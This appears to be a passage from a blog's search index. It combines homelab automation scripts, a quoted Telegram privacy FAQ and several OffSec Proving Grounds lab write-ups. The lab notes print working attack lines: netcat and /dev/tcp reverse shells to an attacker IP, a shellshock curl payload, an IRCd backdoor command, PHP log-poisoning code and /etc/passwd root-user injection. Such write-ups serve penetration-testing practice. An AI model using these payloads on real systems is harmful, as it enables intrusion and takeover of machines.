to tell the owner every 10 mins if the battery falls below 25%. It also tells the owner if the charger is connected with the battery at 100%, every 10 mins between 6 AM and 8 PM.#!/usr/bin/python3# cron job needs to run as - 0,10,20,30,40,50 * * * *import requestsimport datetimeURL = \"https://discord.com/api/webhooks/&lt;&gt;&lt;&gt;&lt;&gt;\" # replace with the url from the channeldef discord_message(percentage = \"\", content = \"Cosmos13 Battery Level = \"): r = requests.post(URL, data = {\"content\": content + str(percentage)}) returnwith open(\"/sys/class/power_supply/BAT0/energy_now\") as f: now = f.read()with open(\"/sys/class/power_supply/BAT0/energy_full\") as f: full = f.read()with open(\"/sys/class/power_supply/ADP0/online\") as f: ac_connected = int(f.read().strip(\"\\n\"))percentage = (int(now.strip(\"\\n\"))*100)//int(full.strip(\"\\n\"))timenow = datetime.datetime.now()if percentage &lt; 29 and ac_connected == 0: discord_message(percentage)elif ac_connected == 1 and percentage &gt; 95 and timenow.hour &gt; 7 and timenow.hour &lt; 21: discord_message(content = \"Cosmos13 AC Still Connected\")Automation via Siri Shortcuts and FlaskThe following method is another way to do the turn off and turn on automatically. The requirements are as follows → Have a smart plug connected via Google Home or Home Kit (in this case it is via Google Home) A flask server running on the server machine Consistent automation for Siri ShortcutsThe web server must deploy the following code →#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flaskimport datetimeapp = Flask(__name__)@app.route('/')def index(): with open(\"/sys/class/power_supply/BAT0/energy_now\") as f: now = f.read() with open(\"/sys/class/power_supply/BAT0/energy_full\") as f: full = f.read() with open(\"/sys/class/power_supply/ADP0/online\") as f: ac_connected = int(f.read().strip(\"\\n\")) percentage = (int(now.strip(\"\\n\"))*100)//int(full.strip(\"\\n\")) timenow = datetime.datetime.now() if percentage &lt; 19 and ac_connected == 0: return \"PlugIn\" elif ac_connected == 1 and percentage &gt; 95: return \"PlugOut\" else: return \"NoStatus\"if __name__ == '__main__': app.run(debug=True, port=9090, host='0.0.0.0')Running this using python3 server.py &amp; serves a web server that informs the status of the battery with PlugIn, PlugOut and NoStatus at a web request. Next, program a shortcut on Siri Shortcuts using the following → Get Content from URL http://server:9090 Get Text from Input If text is equal to PlugIn, run the Google Assistant action in the shortcut to turn smart plug on If text is equal to PlugOut, run the Google Assistant action in the shortcut to turn smart plug off If text is equal to NoStatus, do nothing (BONUS) → A test can be added in a wrapping if statement to check if the variable has a value in these 3 items list; if not, then play a notification to inform that something might be wrong with the web serverNext is the hard part → Make automations on the iPhone device to run this shortcut at every required interval. The values can be modified according to the interval required.As best practice, also make an automation to check the battery level of iPhone device twice each day.To monitor the battery levels for the iPhone using Siri shortcuts, three cases can be considered → Daily at 9:00 PM When battery falls below 30% When battery falls below 20%The script setup for it is as follows → Get Battery Level Add Battery Level to variable batt Get contents of URL (discord webhook) Set Method to POST Add header Content-Type: application/json Add request body {\"content\": \"iPhone 7 Battery Report\" + variable batt} " }, { "title": "Reddit Feeds via Discord WebHooks", "url": "/blog/posts/homelab-discord-reddit/", "categories": "Home Server", "tags": "home-lab, productivity, webhooks, discord, reddit", "date": "2022-02-18 07:00:00 -0500", "snippet": "News Feeds from RedditThis code is to be run on a linux server. A subreddit page can be loaded without authentication and has a huge JSON object which contains information about the window that is ...", "content": "News Feeds from RedditThis code is to be run on a linux server. A subreddit page can be loaded without authentication and has a huge JSON object which contains information about the window that is loaded in the browser. This can be extracted and the corresponding titles of posts can be pulled from the first page.By sorting the feed by Hot and adding a condition to allow posts with the upvote to downvote ratio of higher than 0.9, the best headlines can be collated and sent to the WebHook.The following script uses regex to extract the JSON object and can get unique news headlines with their links across several sends. The uniqueness is guaranteed by keeping a log of the SHA256 hash of the headlines, which is cleared every month leaving only the last 6 entries. The following code is to be run as a cron job as listed in the first comment →#!/usr/bin/python3# cron job runs as follows - 0 20 * * *import reimport jsonimport requestsimport hashlibimport datetimeURL = \"https://discord.com/api/webhooks/&lt;&gt;&lt;&gt;&lt;&gt;\" # add you channel webhookdef discord_message(content = \"test\"): r = requests.post(URL, data = {\"content\": content}) returnr = requests.get(\"https://www.reddit.com/r/technews/hot/\", headers={\"User-Agent\": \"Firefox\"})temp = re.search(r\"&lt;script id=\\\"data\\\"&gt;window\\.___r = .*?;&lt;/script&gt;\", r.text).group(0)data = re.sub(\"&lt;script id=\\\"data\\\"&gt;window\\.___r = (.*?);&lt;/script&gt;\", r\"\\1\", temp)data = json.loads(data)with open(\"/home/tanq/installations/reddit_technews_log\") as f: log_hashes = f.read().split(\"\\n\")posts = data['posts']['models']news_collection = []for i in posts.keys(): if posts[i]['upvoteRatio'] &gt; 0.9 and posts[i]['isSponsored'] == False: if posts[i]['source']['url']: current_hash = hashlib.sha256(posts[i]['title'].encode()).hexdigest() if current_hash in log_hashes: pass else: with open(\"/home/tanq/installations/reddit_technews_log\", \"a\") as f: f.write(current_hash) f.write(\"\\n\") news_collection.append((posts[i]['title'], posts[i]['source']['url'])) if len(news_collection) &gt; 6: breakcontent = \"__*Here is today's news collection from* `r/technews` *subreddit:*__\\n\\n\"for i in news_collection: content = content + '[link](&lt;' + i[1] + '&gt;)' + ' - ' + i[0] + \"\\n\"content += \"\\n\\n\"discord_message(content)day = datetime.datetime.now().dayif day == 1:\tlog_hashes = log_hashes[-14:]\twith open(\"/home/tanq/installations/reddit_technews_log\", \"w\") as f:\t\tfor i in log_hashes:\t\t\tf.write(i)\t\t\tf.write(\"\\n\")The script uses a file reddit_technews_log as a log to maintain SHA256 hashes of previously produced titles. A comparison to those hashes help keep the news headlines unique. Be sure to replace the WebHook URL with the appropriate URL as created within a Discord channel.Meme Feeds from RedditThis is similar to the news feed. The difference is that embeds are being instead to post image type memes only. The code to do this is as follows and also needs to be deployed via cron jobs →#!/usr/bin/python3# cron runs as follows - 0 0 1,5,10,15,20,25 * *import jsonimport requestsimport reimport timeimport hashlibURL = \"https://discord.com/api/webhooks/&lt;&gt;&lt;&gt;&lt;&gt;\"def discord_message(link): r = requests.post(URL, json = {\"embeds\": [{\"image\": {\"url\": link}}]}) returnr = requests.get(\"https://www.reddit.com/r/memes/hot/\", headers={\"User-Agent\": \"Firefox\"})temp = re.search(r\"&lt;script id=\\\"data\\\"&gt;window\\.___r = .*?;&lt;/script&gt;\", r.text).group(0)data_1 = re.sub(\"&lt;script id=\\\"data\\\"&gt;window\\.___r = (.*?);&lt;/script&gt;\", r\"\\1\", temp)data_1 = json.loads(data_1)posts_1 = data_1['posts']['models']memes_collection = []for i in posts_1.keys(): if posts_1[i]['upvoteRatio'] &gt; 0.9 and posts_1[i]['isSponsored'] == False: if 'content' in posts_1[i]['media'].keys() and posts_1[i]['media']['type'] == 'image': memes_collection.append(posts_1[i]['media']['content']) if len(memes_collection) &gt; 2: breakfor i in memes_collection: discord_message(i)" }, { "title": "How Telegram is a Secure Instant Messaging Platform", "url": "/blog/posts/telegram-secure/", "categories": "Computers Newbified", "tags": "productivity, telegram, privacy", "date": "2022-01-20 02:00:00 -0500", "snippet": "The following are sections of text from Telegram’s FAQs and documentation. These have been hand selected by me to give details on the most important things relating to security and privacy. This do...", "content": "The following are sections of text from Telegram’s FAQs and documentation. These have been hand selected by me to give details on the most important things relating to security and privacy. This does not contain much technical-speak but is more general in terms of concepts and meant to be a privacy discussion rather than a technical implementation. Read more about Telegram on their FAQs here.Do you process data requests? Secret chats use end-to-end encryption, thanks to which we don’t have any data to disclose. To protect the data that is not covered by end-to-end encryption, Telegram uses a distributed infrastructure. Cloud chat data is stored in multiple data centers around the globe that are controlled by different legal entities spread across different jurisdictions. The relevant decryption keys are split into parts and are never kept in the same place as the data they protect. As a result, several court orders from different jurisdictions are required to force us to give up any data. Thanks to this structure, we can ensure that no single government or block of like-minded countries can intrude on people’s privacy and freedom of expression. Telegram can be forced to give up data only if an issue is grave and universal enough to pass the scrutiny of several different legal systems around the world. To this day, we have disclosed 0 bytes of user data to third parties, including governments.So how do you encrypt data? We support two layers of secure encryption. Server-client encryption is used in Cloud Chats (private and group chats), Secret Chats use an additional layer of client-client encryption. All data, regardless of type, is encrypted in the same way - be it text, media or files. Our encryption is based on 256-bit symmetric AES encryption, 2048-bit RSA encryption, and Diffie-Hellman secure key exchange.Why should I trust you? Telegram is open source, anyone can check our source code, protocol and API, see how everything works and make an informed decision. Telegram supports verifiable builds, which allow experts to independently verify that our code published on GitHub is the exact same code that is used to build the apps you download from App Store or Google Play. On top of that, Telegram’s primary focus is not to bring a profit, so commercial interests will never interfere with our mission.How secure is Telegram?Telegram is more secure than mass market messengers like WhatsApp and Line. We are based on the MTProto protocol, built upon time-tested algorithms to make security compatible with high-speed delivery and reliability on weak connections. We are continuously working with the community to improve the security of our protocol and clients.What if I’m more paranoid than your regular user?We’ve got you covered. Telegram’s special secret chats use end-to-end encryption, leave no trace on our servers, support self-destructing messages and don’t allow forwarding. On top of this, secret chats are not part of the Telegram cloud and can only be accessed on their devices of origin.How do self-destructing messages work? The Self-Destruct Timer is available for all messages in Secret Chats and for media in private cloud chats. To set the timer, simply tap the clock icon (in the input field on iOS, top bar on Android), and then choose the desired time limit. The clock starts ticking the moment the message is displayed on the recipient’s screen (gets two check marks). As soon as the time runs out, the message disappears from both devices. We will try to send a notification if a screenshot is taken. Please note that the timer in Secret Chats only applies to messages that were sent after the timer was set. It has no effect on earlier messages.Can I be certain that my conversation partner doesn’t take a screenshot? Unfortunately, there is no bulletproof way of detecting screenshots on certain systems (most notably, some Android and Windows Phone devices). We will make every effort to alert you about screenshots taken in your Secret Chats, but it may still be possible to bypass such notifications and take screenshots silently. We advise to share sensitive information only with people you trust. After all, nobody can stop a person from taking a picture of their screen with a different device or an old school camera.Why not just make all chats ‘secret’? All Telegram messages are always securely encrypted. Messages in Secret Chats use client- client encryption, while Cloud Chats use client-server/server-client encryption and are stored encrypted in the Telegram Cloud. This enables your cloud messages to be both secure and immediately accessible from any of your devices even if you lose your device altogether. The problem of restoring access to your chat history on a newly connected device (e.g. when you lose your phone) does not have an elegant solution in the end-to-end encryption paradigm. At the same time, reliable backups are an essential feature for any mass-market messenger. To solve the backup problem, some applications (like WhatsApp and Viber) allow decryptable backups that put their users’ privacy at risk - even if they do not enable backups themselves. Other apps ignore the need for backups altogether and leave their users vulnerable to data loss. We opted for a third approach by offering two distinct types of chats. Telegram disables default system backups and provides all users with an integrated security-focused backup solution in the form of Cloud Chats. Meanwhile, the separate entity of Secret Chats gives you full control over the data you do not want to be stored. This allows Telegram to be widely adopted in broad circles, not just by activists and dissidents, so that the simple fact of using Telegram does not mark users as targets for heightened surveillance in certain countries. We are convinced that the separation of conversations into Cloud and Secret chats represents the most secure solution currently possible for a massively popular messaging application.Can I get Telegram’s server- side code? All Telegram client apps are fully open source. We offer verifiable builds both for iOS and Android - this technology allows to independently verify that the application you download from the app stores was built using the exact same code that we publish. By contrast, publishing the server code doesn’t provide security guarantees neither for Secret Chats nor for Cloud Chats. This is because - unlike with the client-side code - there’s no way to verify that the same code is run on the servers. As for Secret Chats, you don’t need the server-side code to check their integrity - the point of end-to-end encryption is that it must be solid regardless of how the servers function. The encryption and API used on Telegram’s servers are fully documented and open for review by security experts.Telegram uses the camera or microphone in the background! Telegram can use the microphone in the background if you minimize the app when making a call, recording a video, or recording a voice/video message. Permission monitors on Samsung and Xiaomi can inadvertently flag and notify you that Telegram requested access to camera in the background. This happens when the app requests info about the camera - it isn’t using the camera. Unfortunately it may look the same to the Samsung and Xiaomi permission monitors. Camera info is requested by the app when you tap on the attachment button, or start recording a video or a video message. If you do this and quickly close the app, the already initiated request may try to run asynchronously when the app is already in the background, or be sent when the system wakes up the app to show a notification about a new message. In any case, these requests are only for the camera info, the app never uses the camera itself in the background. Anyone can check Telegram’s open source code and confirm that the app is not doing anything behind their back. We also offer reproducible builds that can help you prove that the version you downloaded from App Store or Google Play is built from the exact same source code we publish.Cloud Chats Telegram is a cloud service. We store messages, photos, videos and documents from your cloud chats on our servers so that you can access your data from any of your devices anytime without having to rely on third-party backups. All data is stored heavily encrypted and the encryption keys in each case are stored in several other data centers in different jurisdictions. This way local engineers or physical intruders cannot get access to user data.Secret Chats Secret chats use end-to-end encryption. This means that all data is encrypted with a key that only you and the recipient know. There is no way for us or anybody else without direct access to your device to learn what content is being sent in those messages. We do not store your secret chats on our servers. We also do not keep any logs for messages in secret chats, so after a short period of time we no longer know who or when you messaged via secret chats. For the same reasons secret chats are not available in the cloud - you can only access those messages from the device they were sent to or from.Media in Secret Chats When you send photos, videos or files via secret chats, before being uploaded, each item is encrypted with a separate key, not known to the server. This key and the file’s location are then encrypted again, this time with the secret chat’s key - and sent to your recipient. They can then download and decipher the file. This means that the file is technically on one of Telegram’s servers, but it looks like a piece of random indecipherable garbage to everyone except for you and the recipient. We don’t know what this random data stands for and we have no idea which particular chat it belongs to. We periodically purge this random data from our servers to save disk space.Public Chats In addition to private messages, Telegram also supports public channels and public groups. All public chats are cloud chats. Like everything on Telegram, the data you post in public communities is encrypted, both in storage and in transit but everything you post in public will be accessible to everyone." }, { "title": "OffSec PG - Y0usef", "url": "/blog/posts/oscp-pg-y0usef/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.244.138Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.138OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.244.138Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.138OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.10 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.244.138 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.php icons/ (403) administration/ (403)ExploitationWithout much information from the web scan, the possibility to look at headers was apparent. Adding the X-Forwarded-For: 192.168.244.138 header allows loading of the internal /administration/ directory. The header needs to be added to all subsequent requests via burp intercept.This directory has a login page which does not have SQLi type injections, however, default credentials of admin:admin work. The dashboard of the application gives the ability to upload a file, list users or log out. The .../users page does not list any useful information.Note: There was a spelling error in the links, which needed to be modified to get correct response.The interesting part was the upload functionality. It could be used to upload a reverse shell. However, the application does not directly allow php files. Bypassing this was checked by renaming the file and adding image headers to the content, but it didn’t work.The thing that worked was modifying the Content-Type header to image/gif. This allowed the upload of the reverse shell along with the path of the uploaded file. Navigating to the file grants a shell as the www-data user over netcat. This also gives the user flag.Privilege EscalationUserEnumerating the /etc/passwd file, the users of importance are root, yousef and speech-dispatcher. The /home/ directory contains a file user.txt file which has a base64 encoded string c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=.Decoding this gives the credentials yousef:yousef123. Using this with ssh gives the shell as user yousef.RootChecking the sudo -l capabilities of yousef, it shows that yousef may run any command as root using sudo. Therefore, sudo su grants the root shell and thus, the root flag." }, { "title": "OffSec PG - Wpwn", "url": "/blog/posts/oscp-pg-wpwn/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.80.123Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.123OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.80.123Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.123OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 HTTP Apache httpd 2.4.38 ((Debian)) Web ScanGoBuster scan → gobuster dir -u http://192.168.80.123 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,phpDirectories/files listed → index.html wordpress/Running gobuster again for the wordpress directory gives additional results → index.php wp-content/ wp-login.php wp-includes/ readme.html license.txt wp-trackback.php wp-admin/ xmlrpc.php wp-signup.phpThe folders indicates that an instance of wordpress is running on the web server. Running wpscan on the webserver using the docker image by docker run -it --rm wpscanteam/wpscan --url http://192.168.80.123/wordpress/ gives the following info → Directory listing enabled at /wordpress/wp-content/uploads/ WP-Cron enabled at /wordpress/wp-cron.php Wordpress version 5.5 using generator tag at /wordpress/index.php/feed/ Wordpress theme version 1.5 (latest is 1.8) User admin identified at /wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 Outdated plugin Social Warfare 3.5.2 (latest is 4.3) identified at /wordpress/wp-content/plugins/social-warfare/readme.txtExploitationRFI and RCEUsing searchsploit to search for social warfare gives the result as an RCE for versions &lt; 3.5.3. Looking at the exploit, it needs a payload url to know the payload (an RFI). This will be included in /wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=&lt;RFI_URL&gt;.Reverse shellVisiting this page would give the result of the command in the payload url. The payload must be of the form →&lt;pre&gt;system('whoami')&lt;/pre&gt;. Checking the existence of netcat and bash, a new payload can be used for a reverse shell → nc -e /bin/bash 192.168.49.80 3002. This grants the user flag.Privilege EscalationUserThe users discovered from the reverse shell as www-data are root and takis. Looking through the config of wordpress in wp-config.php, a DB_password is found. This could be used for the takis user on ssh. This works and a user shell is obtained.RootThe takis user is able to run sudo without a password for all commands. Therefore sudo su grants the root shell as well as the root flag." }, { "title": "OffSec PG - Vegeta1", "url": "/blog/posts/oscp-pg-vegeta1/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.72.73Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.72.73OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.72.73Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.72.73OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 HTTP Apache httpd 2.4.38 ((Debian)) Web ScanGoBuster scan → gobuster dir -u http://192.168.72.73 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → img/ (301) image/ (301) admin/ (301) manual/ (301) server-status (403) bulma/ (301)The robots.txt was checked manually during the scan was running. Robots file reveals a directory called find_me. This doesn’t contain any useful information either.ExploitationNone of the directories were really useful. The login pages inside the /admin/ directory were empty. The /bulma/ directory revealed an audio file in the wav format.Uploading the wav file to an online audio decoder shows that the audio is morse code and the text states the presence of a user trunks with a password u$3r. This can be used to login to the ssh server running at the target. This gives us the user flag.Privilege EscalationEnumerating for sudo and setuid binaries on the file system, there was no finding apart from the presence of the setuid binary su. Looked at the bash rc and history files. The history file contained the following interesting entries →perl -le 'print crypt(\"Password@973\",\"addedsalt\")'echo \"Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash\" &gt;&gt; /etc/passwdChecked the permissions of the /etc/passwd file and indeed the user Trunks owned the file. This allowed direct manipulation of the file. Therefore, added the above entry to the passwd file. Then logged in as Tom using the password that was encrypted in the above commands.This gave the root shell and thereby the root flag." }, { "title": "OffSec PG - Sunset Decoy", "url": "/blog/posts/oscp-pg-sunsetdecoy/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.80.85Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.85OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.80.85Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.85OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 HTTP Apache httpd 2.4.38 → Identified file save.zip Web ScanGoBuster scan → gobuster dir -u http://192.168.80.85 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtNo results were listed.ExploitationRetrieved the zip file using curl http://192.168.80.85/save.zip --output save.zip.The zip file is locked. Therefore, cracking with fcrackzip and rockyou password list gives the password as manuel. Extracting it gives the files passwd, group, hostname, shadow and sudoers from the /etc/ directory.The users identified are root with bash and user 296640a3b825115a47b68fc44501c828 with restricted bash.The shadow file contains the hashed password for the identified user. Therefore, sending the entry to john for cracking gives the credentials as 296640a3b825115a47b68fc44501c828:server. This can be used for sshing into the server.The shell received is a restricted shell. Tries many things to escape from the shell. The only thing that worked was to append -t \"bash\" to the ssh command. This allowed the use of / in commands and therefore /bin/cat, which gives the user flag.Privilege EscalationPSPY can be run on the machine. This gives a number of processes running. By looking at the output, the process /bin/sh /root/chkrootkit-0.49/chkrootkit is being run for about 5 seconds every minute. This coincides with the AV scan being run using the honeypot binary in the user’s home directory.Searchsploit lists a privilege escalation exploit. This exploit states that a file can be created by the name update and made executable. It will be executed by chkrootkit whenever it is run. The file must be placed under the /tmp/ directory.Therefore, a reverse shell code can be inserted into the file → /bin/bash -i &gt;&amp; /dev/tcp/192.168.49.80/3002 0&gt;&amp;1.After a minute, a reverse shell is obtained as root. This gives the root flag." }, { "title": "OffSec PG - Sunset Noontide", "url": "/blog/posts/oscp-pg-sunset-noontide/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.56.120Network ScanNmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.56.120OS Detection → Host: irc.foonet.com Port Service Other details ...", "content": "EnumerationMachine IP → 192.168.56.120Network ScanNmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.56.120OS Detection → Host: irc.foonet.com Port Service Other details (if any) 6667, 6697, 8067 IRC UnrealIRCd ExploitationThe only service is an IRC, so searched exploit db via searchsploit for an exploit. This returned 4 entries. Looking at the code for the first one, there seems to be a backdoor which allows execution of shell commands when anything start with AB;.Therefore, access can be checked by connecting to the IRCd via netcat and sending the the payload as AB;echo \"a\" | nc 192.168.49.56 3002. With a listener active on the attacking machine with the IP as in the payload, a conection and the letter “a” would be received.Therefore, a similar payload can be used to receive shell via nc → AB;nc 192.168.49.56 3002 -e /bin/bash. This gives a shell as the server user. The home directory has the user flag.Privilege EscalationWith the shell of the server user, trying default creds of root:root works for getting the shell to root. This gives the root flag." }, { "title": "OffSec PG - Sumo", "url": "/blog/posts/oscp-pg-sumo/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.101.87Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.101.87OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.101.87Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.101.87OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.2.22 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.101.87 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.html cgi-bin/ (403) icons/ (403) doc/ (403)ExploitationThe cgi-bin/ directory looked suspicious. Generally in the past, cgi-bins used to be executed by bash directly and were vulnerable to shellshock. There is however a 403 on the directory. Running it through gobuster again tells the existence of test under that directory. Navigating to it shows that it is the default cgi-bin for the server.The test for vulnerability for shellshock can be done as follows → curl -H \"My-Header: () { :; }; echo; /usr/bin/id\" http://192.168.101.87/cgi-bin/test. If this returns a valid result, then the server is vulnerable.It was found that the server was in fact vulnerable. Therefore, used this as an RCE to get a reverse shell using the following payload → /bin/bash -i &gt;&amp; /dev/tcp/192.168.49.101/3002 0&gt;&amp;1.This gave a shell as the user www-data and subsequently the user flag.Privilege EscalationLooked at the kernel version which is 3.2.0-23-generic. This is very outdated. The OS version is Ubuntu 12.04. The machine is also 64 bit. Looking at results of searchsploit, dirty cow is an exploit that would fit the scenario.There are 4 kinds of dirty cow, the one used for this machine is 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd method). Compiling the exploit and sending the binary via wget allows setting a new user with root permissions.Then, logging in with the newly created user gives the root shell and subseqeuntly the root flag." }, { "title": "OffSec PG - Solistice", "url": "/blog/posts/oscp-pg-solistice/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.124.72Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.124.72OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.124.72Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.124.72OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 21 FTP pyftpdlib 1.5.6 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 25 SMTP Exim smtpd 80 HTTP Apache httpd 2.4.38 ((Debian)) 2121 FTP pyftpdlib 1.5.6 → Anonymous Login Allowed 3128 HTTP Proxy Squid http proxy 4.6 8593 HTTP PHP cli server 5.5 or later (PHP 7.3.14-1) → PHPSESSID HTTPOnly flag not set 54787 HTTP PHP cli server 5.5 or later (PHP 7.3.14-1) 62524 - - Web ScanGoBuster scan → gobuster dir -u http://192.168.124.72 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,phpNothing interesting was revealed in any of the ports.ExploitationLFIThe web server running at port 8593 has the ability to list books via PHP. This is done via a get parameter. Trying LFI with ../../../../../../etc/passwd confirms LFI and gives the result of the file to list possible users which includes www-data, miguel and root.Transition LFI to Apache log poisoningThe default apache error logs are located at /var/log/apache2/error.log. This is readable on the browser because of the LFI vulnerability. Therefore, adding php code to an attempt would add it to the error log and subsequently render it on the webpage.Therefore visiting the url http://192.168.124.72/&lt;?php system($_GET['cmd']);?&gt; should add it to the error log, thereby giving an RCE for the get request parameter in the LFI url. The access via the browser encodes the special characters, therefore a burp repeater request modification should do the trick.Exploiting the RCEWith the php payload injected into the access log, the lfi url can be modified to add the parameter value for the cmd variable. Testing with id works. Next, this can used to test if nc, wget, etc. exist on the system which can be used to create a shell payload. This is the RCE on the server.Both netcat and bash shell exist, therefore sending a payload nc -e /bin/bash 192.168.49.124 3002 with a listener active on the local machine gives a shell with the user www-data.Privilege EscalationLooking at the setuid files and directories using find / -perm -u=s 2&gt;/dev/null, there is a server running at /var/tmp/sv which is a directory that is owned by root and is world-writable.This has an index.php file which just prints that the site is under construction. This cannot be observed from any of the ports enumerated above. Checked the status of this under processes using ps aux | grep root | grep sv. This confirms that the server is actually running, but on localhost only. Therefore, this php file can be edited to have a payload that connects back to the attacker machine to get a reverse shell. Due to the permissions, this would be the root shell.The pentest monkey reverse shell is uploaded to the server and the contents of the index.php file are overwritten with them. Then the execution can be done as follows on the low privileged shell → curl http://localhost:57/index.phpThis gives a shell as the root user and thus the root flag as well." }, { "title": "OffSec PG - So Simple", "url": "/blog/posts/oscp-pg-so-simple/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.244.78Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.78OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernelTable Port Servi...", "content": "EnumerationMachine IP → 192.168.244.78Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.78OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernelTable Port Service Other details (if any) 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.41 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.244.78 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.html icons/ (403) wordpress/ server-status/ (403)Repeating a scan for the /wordpress/ subdirectory, the following were listed → index.php (301) wp-content/ wp-login.php license.txt wp-includes/ readme.html wp-trackback.php wp-admin (302, to wp-login.php)WPScan was also run given the presence of the wordpress site. This revealed the following findings → Plugin Social Warfare 3.5.0 (out of date) Plugin Simple Cart Solution 0.2.0 (out of date) Theme twentynineteen 1.6 (out of date) Wordpress version 5.4.2 Enabled WP-Cron at /wordpress/wp-cron.php Directory listing at /wordpress/wp-content/uploads/ XMLRPC enabled at /xmlrpc.phpExploitationRFI and RCEWith all the information above, the first searchsploit result is that of an RCE in Social Warfare versions &lt; 3.5.3. Looking at the exploit, it needs a payload url to know the payload (an RFI). This will be included in 